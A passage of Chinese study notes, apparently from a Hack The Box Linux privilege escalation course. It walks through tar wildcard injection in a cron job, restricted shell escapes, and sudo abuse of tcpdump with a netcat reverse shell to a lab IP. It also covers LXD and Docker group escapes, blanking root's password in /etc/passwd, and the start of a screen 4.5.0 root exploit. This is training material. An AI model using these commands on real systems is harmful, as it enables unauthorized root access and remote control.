表示匹配所有的可能值。你提供的表达式缺少了具体的数字或通配符，所以不能确定这个表达式的具体含义。</p><p>在一个完整的 cron 表达式中，你需要为每个字段提供具体的值或通配符，以指定定时任务的执行时间。例如，以下是一个有效的 cron 表达式：</p><pre><code>* * * * * command</code></pre><p>这个表达式表示每分钟都执行 <code>command</code> 命令。在实际使用 cron 表达式时，请确保为每个字段提供适当的值，以确保定时任务能够按照你的预期进行执行。</p></blockquote><blockquote><p>这个 cron 表达式表示一个定时任务，它将在每小时的第一分钟（即每小时的 0 分钟）执行一次。该任务的具体命令如下：</p><pre><code class="bash">cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code></pre><p>这个命令执行了两个操作：</p><ol><li><code>cd /root</code>：切换当前工作目录到 <code>/root</code> 目录。</li><li><code>tar -zcf /tmp/backup.tar.gz *</code>：将当前目录中的所有文件和子目录（除了隐藏文件）打包为一个名为 <code>backup.tar.gz</code> 的压缩文件，并保存到 <code>/tmp</code> 目录下。</li></ol><p>在定时任务中使用 <code>*/01</code> 作为分钟字段的值，表示该任务将每小时的每分钟都执行一次。由于 <code>*/01</code> 和 <code>*</code> 效果是相同的，因此也可以简写为 <code>*</code>，这样定时任务的表达式将是 <code>* * * * * cd /root &amp;&amp; tar -zcf /tmp/backup.tar.gz *</code>。</p><p>总结：这个定时任务将在每小时的第一分钟执行，并将 <code>/root</code> 目录中的所有文件和子目录打包为一个压缩文件保存到 <code>/tmp</code> 目录中。</p></blockquote><p>考虑到以上内容，我们可以利用cron作业中的通配符将必要的命令写成文件名。当cron作业运行时，这些文件名将被解释为参数，并执行我们指定的任何命令。</p><pre><code class="shell-session">htb_student@NIX02:~$ echo &#39;echo &quot;cliff.moore ALL=(root) NOPASSWD: ALL&quot; &gt;&gt; /etc/sudoers&#39; &gt; root.shhtb_student@NIX02:~$ echo &quot;&quot; &gt; &quot;--checkpoint-action=exec=sh root.sh&quot;htb_student@NIX02:~$ echo &quot;&quot; &gt; --checkpoint=1</code></pre><blockquote><p>当解析 <code>cliff.moore ALL=(root) NOPASSWD: ALL</code> 这段代码时，我们可以将其分解为以下几个部分：</p><ol><li><p><code>cliff.moore</code>: 这是允许执行 <code>sudo</code> 命令的用户名。换句话说，用户 <code>cliff.moore</code> 可以通过 <code>sudo</code> 命令获得特权执行权限。</p></li><li><p><code>ALL</code>: 这是指用户 <code>cliff.moore</code> 可以在系统中执行任意的命令，即可以在任何位置和任何情况下使用 <code>sudo</code> 命令。</p></li><li><p><code>(root)</code>: 这表示用户 <code>cliff.moore</code> 可以使用 <code>sudo</code> 命令以 root 用户的身份执行命令。在括号中指定了用户 <code>cliff.moore</code> 可以使用的目标用户，这里是 <code>root</code>，即以 root 用户身份执行命令。</p></li><li><p><code>NOPASSWD: ALL</code>: 这表示用户 <code>cliff.moore</code> 在执行 <code>sudo</code> 命令时不需要输入密码，即可以无需验证密码地以 root 用户的身份执行任意命令。</p></li></ol><p>综上所述，该代码的含义是：用户 <code>cliff.moore</code> 可以通过 <code>sudo</code> 命令以 root 用户的身份在系统中执行任意命令，并且在执行 <code>sudo</code> 命令时无需输入密码。这样，用户 <code>cliff.moore</code> 就可以在需要管理员权限的任务上更加便捷地工作，但同时也增加了系统的安全风险。因此，需要谨慎对待对 <code>sudoers</code> 文件的修改，确保只授予必要的权限并只给予可信用户访问权限。</p></blockquote><p>我们可以检查并查看是否创建了必要的文件。</p><pre><code class="shell-session">htb_student@NIX02:~$ ls -latotal 56drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..-rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint=1-rw-rw-r--  1 cliff.moore cliff.moore    1 Aug 31 23:11 --checkpoint-action=exec=sh root.shdrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unixdrwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix-rw-rw-r--  1 cliff.moore cliff.moore   60 Aug 31 23:11 root.sh</code></pre><p>一旦cron作业再次运行，我们就可以检查新添加的sudo权限和直接root的sudo。</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo -lMatching Defaults entries for cliff.moore on NIX02:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser cliff.moore may run the following commands on NIX02:    (root) NOPASSWD: ALL</code></pre><h1 id="Escaping-Restricted-Shells"><a href="#Escaping-Restricted-Shells" class="headerlink" title="Escaping Restricted Shells"></a>Escaping Restricted Shells</h1><p>可以使用几种方法来从受限制的shell中逃脱。其中一些方法涉及利用外壳本身的漏洞，而另一些方法则涉及使用创造性技术来绕过外壳施加的限制。以下是一些可以用于从受限shell中转义的方法示例。</p><h4 id="Command-injection"><a href="#Command-injection" class="headerlink" title="Command injection"></a>Command injection</h4><p>想象我们在一个受限的shell中，它允许我们通过将命令作为参数传递给ls命令来执行命令。不幸的是，shell只允许我们使用一组特定的参数来执行ls命令，例如ls-l或ls-a，但它不允许我们执行任何其他命令。在这种情况下，我们可以通过向ls命令的参数中注入额外的命令，使用命令注入来从shell中转义。 例如，我们可以使用以下命令将pwd命令注入ls命令的参数中：</p><pre><code class="shell-session">Tanin@htb[/htb]$ ls -l `pwd` </code></pre><blockquote><p><code>pwd</code>：这个部分使用反引号 &#96;&#96;&#96; 将 <code>pwd</code> 命令包围起来。这被称为命令替换（Command Substitution）。它的作用是将 <code>pwd</code> 命令的输出结果（即当前工作目录的路径）插入到整个命令中。</p><p>$ ls -l `pwd`<br>total 32<br>-rw-r–r– 1 user user 1024 Jul 16 10:30 file1.txt<br>-rw-r–r– 1 user user 2048 Jul 16 10:31 file2.txt<br>drwxr-xr-x 2 user user 4096 Jul 16 10:32 directory1<br>drwxr-xr-x 2 user user 4096 Jul 16 10:33 directory2<br>…</p></blockquote><h4 id="Command-Substitution"><a href="#Command-Substitution" class="headerlink" title="Command Substitution"></a>Command Substitution</h4><p>另一种从受限shell中转义的方法是使用命令替换。这涉及到使用shell的命令替换语法来执行命令。例如，假设shell允许用户通过将命令封装在backticks（&#96;）中来执行命令。在这种情况下，可以通过在不受shell限制的backtick替换中执行命令来从shell中转义。</p><h4 id="Environment-Variables"><a href="#Environment-Variables" class="headerlink" title="Environment Variables"></a>Environment Variables</h4><p>为了从受限制的shell中转义以使用环境变量，需要修改或创建shell用于执行不受shell限制的命令的环境变量。例如，如果shell使用环境变量来指定执行命令的目录，则可以通过修改环境变量的值以指定不同的目录来从shell中转义。</p><h4 id="Shell-Functions"><a href="#Shell-Functions" class="headerlink" title="Shell Functions"></a>Shell Functions</h4><p>在某些情况下，可以通过使用shell函数来逃离受限制的shell。为此，我们可以定义和调用执行不受shell限制的命令的shell函数。比方说，shell允许用户定义和调用shell函数，可以通过定义执行命令的shell函数来逃离shell。</p><h2 id="practice"><a href="#practice" class="headerlink" title="practice"></a>practice</h2><p>Use different approaches to escape the restricted shell and read the flag.txt file. Submit the contents as the answer.</p><h1 id="Special-Permissions"><a href="#Special-Permissions" class="headerlink" title="Special Permissions"></a>Special Permissions</h1><p>执行时设置用户ID（setuid）权限可以允许用户使用另一个用户的权限（通常具有提升的权限）执行程序或脚本。setuid位显示为s。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -user root -perm -4000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null</code></pre><blockquote><p>在 Linux 文件系统中，文件和目录的权限由 10 个字符表示，其中第一个字符表示文件类型，后面的 9 个字符表示文件的访问权限。在这 9 个字符中，前三个字符表示文件所有者（Owner）的权限，接着的三个字符表示文件所属组（Group）的权限，最后三个字符表示其他用户的权限。</p><p>数字 <code>4000</code> 表示 <code>setuid</code> 权限位。它是 <code>s</code> 权限位的数值表示。<code>s</code> 权限位可以设置在文件的所有者的执行权限位上，以允许文件在执行时获取所有者的权限。</p><p>在权限字符串中，<code>4000</code> 的表示如下：</p><pre><code>-rwsr-xr-x</code></pre><p>其中：</p><ul><li><code>-</code> 表示文件类型为普通文件。</li><li><code>rws</code> 表示设置了 <code>setuid</code> 权限位。实际上，这里的 <code>s</code> 是 <code>x</code> 权限位（执行权限）的替代符，表示设置了 <code>setuid</code>。</li><li><code>r-x</code> 表示文件所有者具有读取和执行权限。</li><li><code>r-x</code> 表示文件所属组和其他用户具有读取和执行权限。</li></ul><p>总结：<code>-rwsr-xr-x</code> 权限位表示此文件是一个普通文件，具有 <code>setuid</code> 权限，所有者拥有读取、写入和执行权限，而组成员和其他用户拥有读取和执行权限。</p><p>在系统中，<code>setuid</code> 权限通常用于一些需要特权身份运行的程序，如 <code>/usr/bin/passwd</code>，以便在更改用户密码时获得必要的权限。但是，<code>setuid</code> 权限需要谨慎使用，因为错误地设置它可能导致系统安全风险。</p></blockquote><p>可能会对设置了SETUID位的程序进行反向工程，识别漏洞，并利用此漏洞提升我们的权限。许多程序都有可以用来执行命令的附加功能，如果在这些程序上设置了setuid位，这些功能就可以用于我们的目的。 Set Group ID（setgid）权限是另一种特殊权限，它允许我们运行二进制文件，就好像我们是创建二进制文件的组的一部分一样。可以使用以下命令枚举这些文件：find&#x2F;-uid 0-perm-6000-type f 2&gt;&#x2F;dev&#x2F;null。可以以与setuid二进制文件相同的方式利用这些文件来提升权限。</p><pre><code class="shell-session">Tanin@htb[/htb]$ find / -user root -perm -6000 -exec ls -ldb &#123;&#125; \; 2&gt;/dev/null-rwsr-sr-x 1 root root 85832 Nov 30  2017 /usr/lib/snapd/snap-confine</code></pre><h2 id="GTFOBins"><a href="#GTFOBins" class="headerlink" title="GTFOBins"></a>GTFOBins</h2><p><a href="https://gtfobins.github.io/">GTFOBins</a>项目是一个精心策划的二进制文件和脚本列表，攻击者可以使用这些文件和脚本来绕过安全限制。每个页面都详细介绍了程序的功能，这些功能可用于突破受限制的shell、提升权限、生成反向shell连接和传输文件。例如，apt-get可以用于突破受限环境，并通过添加预调用命令生成shell：</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh# iduid=0(root) gid=0(root) groups=0(root)</code></pre><h1 id="Sudo-Rights-Abuse"><a href="#Sudo-Rights-Abuse" class="headerlink" title="Sudo Rights Abuse"></a>Sudo Rights Abuse</h1><p>Sudo权限可以授予一个帐户，允许该帐户在根（或另一个帐户）的上下文中运行某些命令，而不必更改用户或授予过多的权限。当发出sudo命令时，系统将检查发出命令的用户是否具有&#x2F;etc&#x2F;sudoers中配置的适当权限。当登录系统时，我们应该始终通过键入sudo-l来检查当前用户是否具有任何sudo权限。有时，我们需要知道用户的密码才能列出他们的sudo权限，但任何带有NOPASSWD选项的权限条目都可以在不输入密码的情况下看到。</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo -lMatching Defaults entries for sysadm on NIX02:    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/binUser sysadm may run the following commands on NIX02:    (root) NOPASSWD: /usr/sbin/tcpdump</code></pre><p>这很容易被误解。例如，用户可以在不需要密码的情况下被授予根级别权限。或者，允许的命令行可能指定得太松散，使我们能够以意外的方式运行程序，从而导致权限提升。例如，如果编辑sudoers文件以授予用户根据sudoers中的以下条目运行命令（如tcpdump）的权限：（ALL）NOPASSWD:&#x2F;usr&#x2F;sbin&#x2F;tcpdump，则攻击者可以利用此权限来利用postrotate命令选项。</p><pre><code class="shell-session">htb_student@NIX02:~$ man tcpdump&lt;SNIP&gt; -z postrorate-command              Used in conjunction with the -C or -G options, this will make `tcpdump` run &quot; postrotate-command file &quot; where the file is the savefile being closed after each rotation. For example, specifying -z gzip or -z bzip2 will compress each savefile using gzip or bzip2.</code></pre><p>通过指定-z标志，攻击者可以使用tcpdump执行shell脚本、获得作为根用户的反向shell或运行其他特权命令。例如，攻击者可以创建包含反向shell的shell脚本.test，并按如下方式执行：</p><pre><code class="shell-session">htb_student@NIX02:~$ sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root</code></pre><blockquote><p>这个命令使用 <code>tcpdump</code> 工具进行网络数据包捕获，并利用 <code>-z</code> 选项指定了一个 shell 脚本 <code>/tmp/.test</code> 来处理捕获的数据包。以下是命令的各个选项的解释：</p><ul><li><code>sudo</code>: 使用超级用户权限运行 <code>tcpdump</code>，因为只有特权用户（如 <code>root</code>）才能进行网络数据包捕获。</li><li><code>tcpdump</code>: 命令本身，用于捕获和显示网络数据包。</li><li><code>-ln</code>: 以数字格式显示输出，并禁用 DNS 反向解析。</li><li><code>-i eth0</code>: 指定网络接口为 <code>eth0</code>，即指定从 <code>eth0</code> 网络接口捕获数据包。</li><li><code>-w /dev/null</code>: 将捕获的数据包写入 <code>/dev/null</code>，即丢弃数据包而不实际保存。</li><li><code>-W 1</code>: 指定数据包文件的最大数量为 1，即每次最多只生成一个数据包文件。</li><li><code>-G 1</code>: 指定生成新数据包文件的时间间隔为 1 秒。</li><li><code>-z /tmp/.test</code>: 指定一个 shell 脚本 <code>/tmp/.test</code> 来处理捕获的数据包。在每个新文件创建时，将运行该脚本，对新文件进行处理。</li><li><code>-Z root</code>: 在 <code>tcpdump</code> 运行时设置当前用户为 <code>root</code>，这通常用于确保在捕获数据包时具有足够的权限。</li></ul></blockquote><p>让我们试试这个。首先，制作一个文件，用postrotate命令执行，添加一个简单的反向shell一行。</p><pre><code class="shell-session">htb_student@NIX02:~$ cat /tmp/.testrm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.3 443 &gt;/tmp/f</code></pre><blockquote><p>这个命令使用了一系列 Linux 命令，下面逐步解释：</p><ol><li><code>rm /tmp/f</code>：删除 <code>/tmp/f</code> 文件，确保之前不存在同名的命名管道（named pipe）。</li><li><code>mkfifo /tmp/f</code>：创建一个命名管道 <code>/tmp/f</code>。命名管道是一种特殊类型的文件，可以用于进程间通信，它允许一个进程将数据写入管道，而另一个进程可以从管道读取数据。</li><li><code>cat /tmp/f | /bin/sh -i 2&gt;&amp;1</code>：将 <code>/tmp/f</code> 命名管道的输出通过管道（<code>|</code>）传递给 <code>/bin/sh</code>，并使用 <code>-i</code> 选项开启一个交互式 Shell。<code>2&gt;&amp;1</code> 将标准错误输出重定向到标准输出，确保错误信息也被传递到 <code>/bin/sh</code>。</li><li><code>nc 10.10.14.3 443 &gt; /tmp/f</code>：将 <code>/bin/sh</code> 的输出通过网络连接传递给 IP 地址为 <code>10.10.14.3</code>，端口号为 <code>443</code> 的远程主机。同时，将从网络连接接收到的数据写入 <code>/tmp/f</code> 命名管道。</li></ol></blockquote><h1 id="Privileged-Groups"><a href="#Privileged-Groups" class="headerlink" title="Privileged Groups"></a>Privileged Groups</h1><h2 id="LXC-x2F-LXD"><a href="#LXC-x2F-LXD" class="headerlink" title="LXC &#x2F; LXD"></a>LXC &#x2F; LXD</h2><p>LXD类似于Docker，是Ubuntu的容器管理器。安装后，所有用户都会添加到LXD组中。通过创建一个LXD容器，使其具有特权，然后访问&#x2F;mnt&#x2F;root上的主机文件系统，可以使用该组的成员身份来提升权限。让我们确认组成员身份，并使用这些权限升级为root用户。</p><pre><code class="shell-session">devops@NIX02:~$ iduid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)</code></pre><p>Unzip the Alpine image.</p><pre><code class="shell-session">devops@NIX02:~$ unzip alpine.zip Archive:  alpine.zipextracting: 64-bit Alpine/alpine.tar.gz  inflating: 64-bit Alpine/alpine.tar.gz.root  cd 64-bit\ Alpine/</code></pre><p>启动LXD初始化过程。为每个提示选择默认值。有关每一步的更多信息，请参阅本文<a href="https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04">post</a> 。</p><pre><code class="shell-session">devops@NIX02:~$ lxd init</code></pre><p>Import the local image.</p><pre><code class="shell-session">devops@NIX02:~$ lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine</code></pre><p>启动一个安全性设置为true的特权容器，以在没有UID映射的情况下运行容器，使容器中的根用户与主机上的根用户相同。</p><pre><code class="shell-session">devops@NIX02:~$ lxc init alpine r00t -c security.privileged=true</code></pre><p>装载主机文件系统。</p><pre><code class="shell-session">devops@NIX02:~$ lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=trueDevice mydev added to r00t</code></pre><p>最后，在容器实例中生成一个shell。我们现在可以以root用户身份浏览已装载的主机文件系统。例如，要访问主机上根目录的内容，请键入cd&#x2F;mnt&#x2F;root&#x2F;root。从这里，我们可以读取&#x2F;etc&#x2F;shadow等敏感文件，并获得密码哈希或访问SSH密钥，以便以root身份连接到主机系统，等等。</p><pre><code class="shell-session">devops@NIX02:~$ lxc start r00tdevops@NIX02:~/64-bit Alpine$ lxc exec r00t /bin/sh~ # iduid=0(root) gid=0(root)~ # </code></pre><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><p>将用户放在docker组中本质上相当于在不需要密码的情况下对文件系统进行根级访问。docker组的成员可以生成新的docker容器。一个例子是运行命令docker run-v&#x2F;root:&#x2F;mnt-it ubuntu。此命令创建一个新的Docker实例，其中主机文件系统上的&#x2F;root目录作为卷安装。一旦容器启动，我们就可以浏览到已安装的目录，并为根用户检索或添加SSH密钥。这可以对其他目录（如&#x2F;etc&#x2F;shadow文件）执行，这些目录可用于检索&#x2F;etc&#x2F;shadow文件的内容以进行脱机密码破解或添加特权用户。</p><h2 id="Disk"><a href="#Disk" class="headerlink" title="Disk"></a>Disk</h2><p>磁盘组中的用户可以完全访问&#x2F;dev&#x2F;sda1中包含的任何设备，例如&#x2F;dev&#x2F;sda1，它通常是操作系统使用的主要设备。具有这些权限的攻击者可以使用debugfs以根级别权限访问整个文件系统。与Docker组示例一样，这可以用于检索SSH密钥、凭据或添加用户。</p><h2 id="ADM"><a href="#ADM" class="headerlink" title="ADM"></a>ADM</h2><p>adm组的成员可以读取&#x2F;var&#x2F;log中存储的所有日志。这不会直接授予root访问权限，但可以用来收集存储在日志文件中的敏感数据，或枚举用户操作和运行cron作业。</p><h2 id="practice-1"><a href="#practice-1" class="headerlink" title="practice"></a>practice</h2><p> <strong>Use the privileged group rights of the secaudit user to locate a flag.</strong></p><h1 id="Capabilities"><a href="#Capabilities" class="headerlink" title="Capabilities"></a>Capabilities</h1><p>设置功能包括使用适当的工具和命令为可执行文件或程序分配特定的功能。例如，在Ubuntu中，我们可以使用setcap命令为特定的可执行文件设置功能。此命令允许我们指定要设置的功能和要分配的值。 例如，我们可以使用以下命令为可执行文件设置cap_net_bind_service功能：</p><h4 id="Set-Capability"><a href="#Set-Capability" class="headerlink" title="Set Capability"></a>Set Capability</h4><pre><code class="shell-session">Tanin@htb[/htb]$ sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic</code></pre><p>当为二进制文件设置了功能时，这意味着二进制文件将能够执行特定的操作，而如果没有这些功能，它将无法执行这些操作。例如，如果为二进制文件设置了cap_net_bind_service功能，则该二进制文件将能够绑定到网络端口，这是一种通常受到限制的特权。 某些功能，如cap_sys_admin，允许可执行文件以管理权限执行操作，如果使用不当，可能会造成危险。例如，我们可以利用它们来提升其权限、获取对敏感信息的访问权限或执行未经授权的操作。因此，为适当的沙盒和隔离的可执行文件设置这些类型的功能并避免不必要地授予它们是至关重要的。</p><table><thead><tr><th><strong>能力</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>cap_sys_admin</code></td><td>允许使用管理权限执行操作，例如修改系统文件或更改系统设置。</td></tr><tr><td><code>cap_sys_chroot</code></td><td>允许更改当前进程的根目录，允许它访问原本无法访问的文件和目录。</td></tr><tr><td><code>cap_sys_ptrace</code></td><td>允许附加到和调试其他进程，可能允许它访问敏感信息或修改其他进程的行为。</td></tr><tr><td><code>cap_sys_nice</code></td><td>允许提高或降低进程的优先级，从而可能允许它访问原本会受到限制的资源。</td></tr><tr><td><code>cap_sys_time</code></td><td>允许修改系统时钟，可能允许它操纵时间戳或导致其他进程以意外方式运行。</td></tr><tr><td><code>cap_sys_resource</code></td><td>允许修改系统资源限制，例如打开文件描述符的最大数量或可以分配的最大内存量。</td></tr><tr><td><code>cap_sys_module</code></td><td>允许加载和卸载内核模块，可能允许它修改操作系统的行为或访问敏感信息。</td></tr><tr><td><code>cap_net_bind_service</code></td><td>允许绑定到网络端口，可能允许它访问敏感信息或执行未经授权的操作。</td></tr></tbody></table><table><thead><tr><th><strong>能力值</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>=</code></td><td>此值为可执行文件设置指定的功能，但不授予任何权限。如果我们想清除可执行文件先前设置的功能，这会很有用。</td></tr><tr><td><code>+ep</code></td><td>此值向可执行文件授予指定功能的有效和允许的权限。这允许可执行文件执行该功能允许的操作，但不允许它执行功能不允许的任何操作。</td></tr><tr><td><code>+ei</code></td><td>此值为可执行文件的指定功能授予足够的可继承权限。这允许可执行文件执行该功能允许的操作，以及可执行文件生成的子进程继承功能并执行相同的操作。</td></tr><tr><td><code>+p</code></td><td>此值向可执行文件授予指定功能的允许权限。这允许可执行文件执行该功能允许的操作，但不允许它执行功能不允许的任何操作。如果我们想要向可执行文件授予功能，但阻止它继承该功能或允许子进程继承它，这可能很有用。</td></tr></tbody></table><table><thead><tr><th><strong>能力</strong></th><th><strong>描述</strong></th></tr></thead><tbody><tr><td><code>CAP_SETUID</code></td><td>允许进程设置其有效用户 ID，该 ID 可用于获取其他用户（包括该用户）的特权。<code>root</code></td></tr><tr><td><code>CAP_SETGID</code></td><td>允许设置其有效组 ID，可用于获取另一个组（包括该组）的权限。<code>root</code></td></tr><tr><td><code>CAP_SYS_ADMIN</code></td><td>此功能提供了广泛的管理权限，包括能够执行为用户保留的许多操作，例如修改系统设置以及挂载和卸载文件系统。<code>root</code></td></tr></tbody></table><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>如果我们使用低权限帐户访问了系统，但没有cap_sys_admin功能：</p><h4 id="Exploiting-Capabilities"><a href="#Exploiting-Capabilities" class="headerlink" title="Exploiting Capabilities"></a>Exploiting Capabilities</h4><pre><code class="shell-session">Tanin@htb[/htb]$ getcap /usr/bin/vim.basic/usr/bin/vim.basic cap_dac_override=eip</code></pre><p>例如，&#x2F;usr&#x2F;bin&#x2F;vim.basic二进制文件在没有特殊权限的情况下运行，例如使用sudo。然而，由于二进制文件具有cap_sys_admin功能集，因此它可以提升运行它的用户的权限。这将允许渗透测试人员获得cap_sys_admin功能并执行需要此功能的任务。 让我们看看&#x2F;etc&#x2F;passwd文件，其中指定了用户root：</p><pre><code class="shell-session">Tanin@htb[/htb]$ cat /etc/passwd | head -n1root:x:0:0:root:/root:/bin/bash</code></pre><p>我们可以使用&#x2F;usr&#x2F;bin&#x2F;vim二进制文件的cap_sys_admin功能来修改系统文件：</p><pre><code class="shell-session">Tanin@htb[/htb]$ /usr/bin/vim.basic /etc/passwd</code></pre><p>我们还可以在非交互式模式下进行这些更改：</p><pre><code class="shell-session">Tanin@htb[/htb]$ echo -e &#39;:%s/^root:[^:]*:/root::/\nwq&#39; | /usr/bin/vim.basic -es /etc/passwdTanin@htb[/htb]$ cat /etc/passwd | head -n1</code></pre><blockquote><p><code>vim -es</code> 是用于以批处理（非交互式）模式运行 Vim 编辑器的命令。在这个模式下，Vim 将在不显示图形用户界面（GUI）的情况下运行，并执行指定的编辑操作或脚本，然后退出。这种模式通常用于自动化编辑任务、批量处理文本文件或在脚本中使用 Vim。</p><p>解释一下命令中的选项：</p><ul><li><p><code>vim</code>：是 Vim 编辑器的命令。</p></li><li><pre><code>-es</code></pre><p>：是 Vim 的选项之一，它表示启动 Vim 编辑器并进入批处理模式。</p><ul><li><code>-e</code>：表示以 Ex 模式启动 Vim，该模式是 Vim 的批处理编辑模式，不显示交互式界面。</li><li><code>-s</code>：表示将 Vim 当作脚本执行。这个选项需要与 <code>-e</code> 一起使用，将 Vim 用于自动化编辑任务和批量处理。</li></ul></li></ul><p>使用 <code>vim -es</code> 后，可以通过标准输入或文件输入来执行编辑操作或脚本。例如，可以通过输入 Ex 命令来编辑文件、搜索和替换文本等，然后退出 Vim。</p></blockquote><p>现在，我们可以看到这一行中的x已经不见了，这意味着我们可以使用命令su以root身份登录，而无需询问密码。</p><blockquote><p>在 Linux 系统中，<code>/etc/passwd</code> 文件中的每一行描述一个用户账号的信息，以冒号分隔字段。其中，<code>root:x:0:0:root:/root:/bin/bash</code> 这一行表示 <code>root</code> 用户的账号信息。</p><ul><li>第一个字段 <code>root</code> 是用户名，表示账号的登录名。</li><li>第二个字段 <code>x</code> 是密码字段。在过去，密码是以明文存储在 <code>/etc/passwd</code> 文件中，但为了增加安全性，现代系统一般将密码存储在 <code>/etc/shadow</code> 文件中，而在 <code>/etc/passwd</code> 文件中用 <code>x</code> 占位。真正的密码哈希值存储在 <code>/etc/shadow</code> 文件中，只有超级用户（通常是 <code>root</code> 用户）可以访问该文件。</li><li>第三个字段 <code>0</code> 是用户ID（UID，User ID）。<code>0</code> 表示 <code>root</code> 用户的用户ID，<code>0</code> 是预留给超级用户（root）的特殊用户ID。</li><li>第四个字段 <code>0</code> 是组ID（GID，Group ID）。同样，<code>0</code> 表示 <code>root</code> 用户所属的组ID，即预留给超级用户组的特殊组ID。</li><li>第五个字段 <code>root</code> 是用户的全名或注释字段，通常是对用户的描述。</li><li>第六个字段 <code>/root</code> 是用户的主目录，即 <code>root</code> 用户的家目录。</li><li>第七个字段 <code>/bin/bash</code> 是用户登录后使用的默认 shell。</li></ul><p>在现代系统中，密码字段中的 <code>x</code> 表示密码信息存储在 <code>/etc/shadow</code> 文件中，因此 <code>/etc/passwd</code> 中并不包含实际的密码信息。这样可以增加系统的安全性，因为只有超级用户才能访问 <code>/etc/shadow</code> 文件，一般用户无法获取到真正的密码哈希值。</p></blockquote><p>现在，我们可以看到这一行中的x已经不见了，这意味着我们可以使用命令su以root身份登录，而无需询问密码。</p><h2 id="practice-2"><a href="#practice-2" class="headerlink" title="practice"></a>practice</h2><p> <strong>Escalate the privileges using capabilities and read the flag.txt file in the “&#x2F;root” directory. Submit its contents as the answer.</strong></p><p>这里跟上面的示例差不多，唯一的区别是在修改passwd文件时需要使用wq！退出才能有效</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202307161934479.png" alt="image-20230716193413383"></p><blockquote><p>在 Vim 中，<code>:wq!</code> 和 <code>:wq</code> 是两个不同的命令，分别用于保存文件并退出 Vim。</p><ol><li><code>:wq!</code>：这个命令用于保存文件并强制退出 Vim。如果当前编辑的文件没有写权限或者是只读文件，或者 Vim 检测到文件已被修改但未保存，<code>:wq!</code> 命令会强制保存文件并退出编辑器。如果文件是只读的，会提示是否保存为另一个文件。</li><li><code>:wq</code>：这个命令用于保存文件并退出 Vim。如果当前编辑的文件有写权限且没有被其他程序锁定，并且没有未保存的修改，<code>:wq</code> 命令会保存文件并退出编辑器。如果文件是只读的或者有未保存的修改，Vim 会给出相应的提示并不会退出编辑器。</li></ol><p>在 Vim 中，冒号 <code>:</code> 是用于输入命令的前缀符号。要使用上述命令，需要按下 Esc 键以确保退出插入模式，然后在 Normal 模式下输入 <code>:wq!</code> 或 <code>:wq</code>，然后按 Enter 键执行相应的命令。</p><p>综上所述，<code>wq!</code> 和 <code>wq</code> 在功能上的区别主要是 <code>!</code> 的作用，用于强制执行保存操作。</p></blockquote><p>这里再解释一下：</p><blockquote><p><code>:%s/^root:[^:]*:/root::/</code> 是 Vim 编辑器的替换命令，用于在编辑器中对文本进行查找和替换操作。解析如下：</p><ul><li><p><code>:</code>：冒号是进入 Vim 的命令行模式的前缀符号。</p></li><li><p><code>%</code>：在 Vim 中 <code>%</code> 表示全局范围，用于指定查找和替换操作在整个文件中执行。</p></li><li><p><code>s</code>：<code>s</code> 是替换命令的简写，用于执行查找和替换操作。</p></li><li><pre><code>/^root:[^:]*:/</code></pre><p>：这是查找模式，用于匹配以 </p><pre><code>root:</code></pre><p> 开头的文本。解析如下：</p><ul><li><code>^</code>：表示匹配行的开头。</li><li><code>root:</code>：表示要匹配的文本以 <code>root:</code> 开头。</li><li><code>[^:]*</code>：表示匹配零个或多个非冒号字符，即匹配 <code>root:</code> 后的用户名。</li><li><code>:</code>：表示匹配冒号。</li></ul></li><li><pre><code>/root::/</code></pre><p>：这是替换模式，用于将匹配的文本替换为 </p><pre><code>root::</code></pre><p>。解析如下：</p><ul><li><code>root::</code>：表示要替换的文本为 <code>root::</code>，即清空密码字段。</li></ul></li></ul></blockquote><h1 id="Vulnerable-Services"><a href="#Vulnerable-Services" class="headerlink" title="Vulnerable Services"></a>Vulnerable Services</h1><h4 id="Screen-Version-Identification"><a href="#Screen-Version-Identification" class="headerlink" title="Screen Version Identification"></a>Screen Version Identification</h4><pre><code class="shell-session">Tanin@htb[/htb]$ screen -vScreen version 4.05.00 (GNU) 10-Dec-16</code></pre><p>4.5.0版本存在权限提升漏洞，原因是打开日志文件时缺少权限检查。</p><p>这使攻击者能够截断任何文件或在任何目录中创建root拥有的文件，并最终获得完全的root访问权限。</p><h4 id="Privilege-Escalation-Screen-Exploit-sh"><a href="#Privilege-Escalation-Screen-Exploit-sh" class="headerlink" title="Privilege Escalation - Screen_Exploit.sh"></a>Privilege Escalation - Screen_Exploit.sh</h4><pre><code class="bash">#!/bin/bash# screenroot.sh# setuid screen v4.5.0 local root exploit# abuses ld.so.preload overwriting to get root.# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html# HACK THE PLANET# ~ infodox (25/1/2017)echo &quot;~ gnu/screenroot ~&quot;echo &quot;[+] First, we 